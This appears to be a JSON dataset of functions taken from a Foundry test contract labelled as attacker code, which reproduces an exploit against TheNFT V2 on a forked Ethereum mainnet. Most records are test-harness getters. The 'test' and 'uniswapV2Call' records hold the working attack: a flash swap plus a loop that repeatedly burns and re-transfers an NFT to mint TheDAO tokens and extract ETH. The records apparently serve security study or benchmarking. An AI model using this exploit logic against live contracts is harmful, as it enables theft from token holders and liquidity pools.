[
  {
    "contract/interface": "TheNFTV2Test",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "TheNFTV2Test",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "TheNFTV2Test",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "TheNFTV2Test",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "TheNFTV2Test",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "TheNFTV2Test",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"mainnet\", 18_647_450);\n        vm.label(address(WETH), \"WETH\");\n        vm.label(address(THENFTV2), \"THENFTV2\");\n        vm.label(address(uniswap), \"Uniswap Pair\");\n        vm.label(address(TheDAO), \"TheDAO\");\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "TheNFTV2Test",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "TheNFTV2Test",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "TheNFTV2Test",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "TheNFTV2Test",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "TheNFTV2Test",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "TheNFTV2Test",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "TheNFTV2Test",
    "source_type": "attacker_contract",
    "function_name": "test",
    "original_code": "    function test() public {\n        address[] memory assets = new address[](1);\n        assets[0] = address(WETH);\n        uint256[] memory amounts = new uint256[](1);\n        amounts[0] = 80_000 * 1e18;\n        uint256[] memory modes = new uint256[](1);\n        modes[0] = 0;\n\n        emit log_named_decimal_uint(\"[Start] Attacker ETH Balance\", WETH.balanceOf(address(this)), WETH.decimals());\n\n        uint256 balanceBefore = address(this).balance;\n        vm.prank(hacker);\n        THENFTV2.transferFrom(address(hacker), address(this), nftId);\n\n        uniswap.swap(0, 1_906_331_836_125_411_716, address(this), new bytes(1));\n        uint256 balanceAfter = address(this).balance;\n        assert(balanceAfter > balanceBefore);\n\n        emit log_named_decimal_uint(\"Attacker ETH balance after exploit\", address(this).balance, 0);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "TheNFTV2Test",
    "source_type": "attacker_contract",
    "function_name": "uniswapV2Call",
    "original_code": "    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {\n        (uint256 thedaoReserve, uint256 wethReserve,) = uniswap.getReserves();\n        emit log_named_uint(\"k0:\", thedaoReserve * wethReserve);\n        uint256 amountOut = amount1;\n        uint256 amountIn = getAmountIn(amountOut, thedaoReserve, wethReserve);\n        emit log_named_uint(\"amountIn\", amountIn);\n\n        do {\n            THENFTV2.approve(address(this), nftId);\n            THENFTV2.burn(nftId);\n            THENFTV2.transferFrom(deadaddress, address(this), nftId);\n        } while (TheDAO.balanceOf(address(this)) < amountIn);\n        TheDAO.transfer(address(uniswap), TheDAO.balanceOf(address(this)));\n        WETH.withdraw(WETH.balanceOf(address(this)));\n    }\n\n",
    "description": ""
  }
]